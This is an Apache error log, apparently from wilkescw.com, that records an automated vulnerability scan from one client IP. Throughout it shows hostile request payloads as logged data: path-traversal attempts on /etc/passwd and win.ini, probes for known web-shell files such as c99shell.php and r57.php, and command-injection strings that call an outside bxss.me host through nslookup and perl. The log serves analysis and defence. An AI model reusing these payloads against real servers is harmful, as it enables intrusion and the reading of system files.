[Thu Jul 08 02:43:12.469052 2021] [core:error] [pid 17708] [client 27.147.202.214:1853] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:12.668826 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config - Copy - Copy.php' not found or unable to stat
[Thu Jul 08 02:43:12.670205 2021] [php7:error] [pid 17353] [client 27.147.202.214:1870] script '/var/www/html/wilkescw.com/fonts/r57.php' not found or unable to stat
[Thu Jul 08 02:43:12.962407 2021] [php7:error] [pid 17353] [client 27.147.202.214:1870] script '/var/www/html/wilkescw.com/fonts/r58.php' not found or unable to stat
[Thu Jul 08 02:43:13.270593 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/c99shell.php' not found or unable to stat
[Thu Jul 08 02:43:13.525859 2021] [core:error] [pid 17751] [client 27.147.202.214:1397] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:13.580994 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/c99.php' not found or unable to stat
[Thu Jul 08 02:43:13.854491 2021] [core:error] [pid 17798] [client 27.147.202.214:1400] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:13.897699 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/nstview.php' not found or unable to stat
[Thu Jul 08 02:43:14.228789 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/nst.php' not found or unable to stat
[Thu Jul 08 02:43:14.298440 2021] [core:error] [pid 17615] [client 27.147.202.214:1399] AH00126: Invalid URI in request GET /fonts/OpenSans//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 02:43:14.520686 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/rst.php' not found or unable to stat
[Thu Jul 08 02:43:14.539421 2021] [core:error] [pid 17759] (36)File name too long: [client 27.147.202.214:5916] AH00036: access to /css/;(nslookup hitwogrtpyjmof63d3.bxss.me||perl -e "gethostbyname('hitwogrtpyjmof63d3.bxss.me')")|(nslookup hitwogrtpyjmof63d3.bxss.me||perl -e "gethostbyname('hitwogrtpyjmof63d3.bxss.me')")&(nslookup hitwogrtpyjmof63d3.bxss.me||perl -e "gethostbyname('hitwogrtpyjmof63d3.bxss.me')").css failed (filesystem path '/var/www/html/wilkescw.com/css/;(nslookup hitwogrtpyjmof63d3.bxss.me||perl -e "gethostbyname('hitwogrtpyjmof63d3.bxss.me')")|(nslookup hitwogrtpyjmof63d3.bxss.me||perl -e "gethostbyname('hitwogrtpyjmof63d3.bxss.me')")&(nslookup hitwogrtpyjmof63d3.bxss.me||perl -e "gethostbyname('hitwogrtpyjmof63d3.bxss.me')").css')
[Thu Jul 08 02:43:14.821966 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/r57eng.php' not found or unable to stat
[Thu Jul 08 02:43:15.112419 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/shell.php' not found or unable to stat
[Thu Jul 08 02:43:15.193235 2021] [core:error] [pid 17285] [client 27.147.202.214:13125] AH00126: Invalid URI in request GET /fonts/OpenSans//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:15.422650 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/dra.php' not found or unable to stat
[Thu Jul 08 02:43:15.745583 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/r.php' not found or unable to stat
[Thu Jul 08 02:43:15.832632 2021] [core:error] [pid 16509] [client 27.147.202.214:1396] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:16.062472 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/lol.php' not found or unable to stat
[Thu Jul 08 02:43:16.077460 2021] [core:error] [pid 17804] [client 27.147.202.214:1406] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:16.139293 2021] [core:error] [pid 17383] [client 27.147.202.214:13068] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:16.359354 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/zehir.php' not found or unable to stat
[Thu Jul 08 02:43:16.484142 2021] [authz_core:error] [pid 17788] [client 27.147.202.214:11433] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/css/.htaccess~
[Thu Jul 08 02:43:16.542963 2021] [core:error] [pid 17353] [client 27.147.202.214:1870] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:16.652132 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:43:16.797925 2021] [authz_core:error] [pid 17788] [client 27.147.202.214:11433] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/css/.htaccess.old
[Thu Jul 08 02:43:16.966689 2021] [core:error] [pid 17285] [client 27.147.202.214:13174] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:16.978542 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:43:17.028264 2021] [core:error] [pid 17808] [client 27.147.202.214:1410] AH00126: Invalid URI in request GET /icons/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:43:17.133559 2021] [authz_core:error] [pid 16694] [client 27.147.202.214:5926] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/css/.htaccess.save
[Thu Jul 08 02:43:17.287132 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:43:17.600646 2021] [autoindex:error] [pid 16312] [client 27.147.202.214:13179] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 02:43:17.601359 2021] [autoindex:error] [pid 17752] [client 27.147.202.214:13065] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 02:43:17.792854 2021] [autoindex:error] [pid 17790] [client 27.147.202.214:13191] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 02:43:18.062388 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/c501zMQGa.php' not found or unable to stat
[Thu Jul 08 02:43:18.418641 2021] [core:error] [pid 17615] [client 27.147.202.214:13193] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:18.472104 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/old_config.php' not found or unable to stat
[Thu Jul 08 02:43:18.650282 2021] [php7:error] [pid 16509] [client 27.147.202.214:13195] script '/var/www/html/wilkescw.com/lrps3c501.php' not found or unable to stat
[Thu Jul 08 02:43:18.779956 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config_old.php' not found or unable to stat
[Thu Jul 08 02:43:19.067683 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/bak_config.php' not found or unable to stat
[Thu Jul 08 02:43:19.219527 2021] [autoindex:error] [pid 17762] [client 27.147.202.214:1403] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.wilkescw.com/css/main.css
[Thu Jul 08 02:43:19.287384 2021] [negotiation:error] [pid 17754] [client 27.147.202.214:1409] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c501 (None could be negotiated).
[Thu Jul 08 02:43:19.357303 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config_bak.php' not found or unable to stat
[Thu Jul 08 02:43:19.427198 2021] [php7:error] [pid 17836] [client 27.147.202.214:13203] script '/usr/share/apache2/icons/fa5tt0x3sxeg.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:19.448737 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/c510NZVMP.php' not found or unable to stat
[Thu Jul 08 02:43:19.606378 2021] [autoindex:error] [pid 17790] [client 27.147.202.214:13197] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:19.663546 2021] [core:error] [pid 17835] [client 27.147.202.214:13209] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:19.877581 2021] [core:error] [pid 17383] (36)File name too long: [client 27.147.202.214:13187] AH00036: access to /;(nslookup hitkoylukwktw0e7d6.bxss.me||perl -e "gethostbyname('hitkoylukwktw0e7d6.bxss.me')")|(nslookup hitkoylukwktw0e7d6.bxss.me||perl -e "gethostbyname('hitkoylukwktw0e7d6.bxss.me')")&(nslookup hitkoylukwktw0e7d6.bxss.me||perl -e "gethostbyname('hitkoylukwktw0e7d6.bxss.me')")/style.css failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitkoylukwktw0e7d6.bxss.me||perl -e "gethostbyname('hitkoylukwktw0e7d6.bxss.me')")|(nslookup hitkoylukwktw0e7d6.bxss.me||perl -e "gethostbyname('hitkoylukwktw0e7d6.bxss.me')")&(nslookup hitkoylukwktw0e7d6.bxss.me||perl -e "gethostbyname('hitkoylukwktw0e7d6.bxss.me')")')
[Thu Jul 08 02:43:19.896460 2021] [autoindex:error] [pid 17615] [client 27.147.202.214:13214] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 02:43:19.947726 2021] [core:error] [pid 16509] [client 27.147.202.214:13195] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:20.018189 2021] [php7:error] [pid 17808] [client 27.147.202.214:13194] script '/var/www/html/wilkescw.com/TCtLMc510.php' not found or unable to stat
[Thu Jul 08 02:43:20.173945 2021] [php7:error] [pid 17811] [client 27.147.202.214:13212] script '/var/www/html/wilkescw.com/backup_config.php' not found or unable to stat
[Thu Jul 08 02:43:20.208882 2021] [autoindex:error] [pid 17817] [client 27.147.202.214:13215] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 02:43:20.248913 2021] [php7:error] [pid 17804] [client 27.147.202.214:13186] script '/var/www/html/wilkescw.com/response.write(9865153*9247900).php' not found or unable to stat
[Thu Jul 08 02:43:20.348018 2021] [negotiation:error] [pid 17837] [client 27.147.202.214:13210] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c510 (None could be negotiated).
[Thu Jul 08 02:43:20.387205 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/echo odpgcj$()\\ xwakgc\\nz^xyu||a #' &echo odpgcj$()\\ xwakgc\\nz^xyu||a #|" &echo odpgcj$()\\ xwakgc\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 02:43:20.441642 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/CUhZComv.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:20.458469 2021] [php7:error] [pid 17811] [client 27.147.202.214:13212] script '/var/www/html/wilkescw.com/config_backup.php' not found or unable to stat
[Thu Jul 08 02:43:20.544091 2021] [php7:error] [pid 17835] [client 27.147.202.214:13206] script '/var/www/html/wilkescw.com/'+response.write(9865153*9247900)+'.php' not found or unable to stat
[Thu Jul 08 02:43:20.678098 2021] [php7:error] [pid 17754] [client 27.147.202.214:1409] script '/var/www/html/wilkescw.com/&echo zrvcgl$()\\ ozwvuq\\nz^xyu||a #' &echo zrvcgl$()\\ ozwvuq\\nz^xyu||a #|" &echo zrvcgl$()\\ ozwvuq\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 02:43:20.743938 2021] [authz_core:error] [pid 17762] [client 27.147.202.214:1403] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/.php, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:20.835232 2021] [php7:error] [pid 17835] [client 27.147.202.214:13206] script '/var/www/html/wilkescw.com/"+response.write(9865153*9247900)+".php' not found or unable to stat
[Thu Jul 08 02:43:20.960499 2021] [php7:error] [pid 17754] [client 27.147.202.214:1409] script '/var/www/html/wilkescw.com/|echo ikbfhz$()\\ jijyaa\\nz^xyu||a #' |echo ikbfhz$()\\ jijyaa\\nz^xyu||a #|" |echo ikbfhz$()\\ jijyaa\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 02:43:21.237212 2021] [core:error] [pid 17772] [client 27.147.202.214:13199] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:21.242228 2021] [php7:error] [pid 17754] [client 27.147.202.214:1409] script '/var/www/html/wilkescw.com/(nslookup hitjrlrapfpyr46495.bxss.me||perl -e "gethostbyname('hitjrlrapfpyr46495.bxss.me')").php' not found or unable to stat
[Thu Jul 08 02:43:21.271607 2021] [php7:error] [pid 17839] [client 27.147.202.214:13204] script '/var/www/html/wilkescw.com/c501&n929673=v979962.php' not found or unable to stat
[Thu Jul 08 02:43:21.311746 2021] [php7:error] [pid 17762] [client 27.147.202.214:1403] script '/var/www/html/wilkescw.com/).php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:21.522577 2021] [core:error] [pid 16532] [client 27.147.202.214:1398] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:21.592817 2021] [php7:error] [pid 17365] [client 27.147.202.214:13196] script '/var/www/html/wilkescw.com/!(()&&!|*|*|.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:21.594208 2021] [php7:error] [pid 17754] [client 27.147.202.214:1409] script '/var/www/html/wilkescw.com/c516NZbHu.php' not found or unable to stat
[Thu Jul 08 02:43:21.924564 2021] [php7:error] [pid 17365] [client 27.147.202.214:13196] script '/var/www/html/wilkescw.com/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:22.229311 2021] [php7:error] [pid 17754] [client 27.147.202.214:1409] script '/var/www/html/wilkescw.com/6e5vec516.php' not found or unable to stat
[Thu Jul 08 02:43:22.238050 2021] [core:error] [pid 17756] [client 27.147.202.214:13200] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:22.564172 2021] [core:error] [pid 17759] [client 27.147.202.214:5916] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:22.623760 2021] [negotiation:error] [pid 17365] [client 27.147.202.214:13196] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c516 (None could be negotiated).
[Thu Jul 08 02:43:22.996177 2021] [php7:error] [pid 17353] [client 27.147.202.214:13190] script '/var/www/html/wilkescw.com/'.gethostbyname(lc('hitwm'.'zteelnexb2dc0.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(113).chr(69).chr(107).chr(74).'.php' not found or unable to stat
[Thu Jul 08 02:43:23.384300 2021] [php7:error] [pid 17798] [client 27.147.202.214:13208] script '/var/www/html/wilkescw.com/old_c501.php' not found or unable to stat
[Thu Jul 08 02:43:23.594356 2021] [core:error] [pid 17841] [client 27.147.202.214:13189] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:23.703648 2021] [php7:error] [pid 17835] [client 27.147.202.214:13206] script '/var/www/html/wilkescw.com/bxss.me.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:23.707579 2021] [php7:error] [pid 17798] [client 27.147.202.214:13208] script '/var/www/html/wilkescw.com/c501_old.php' not found or unable to stat
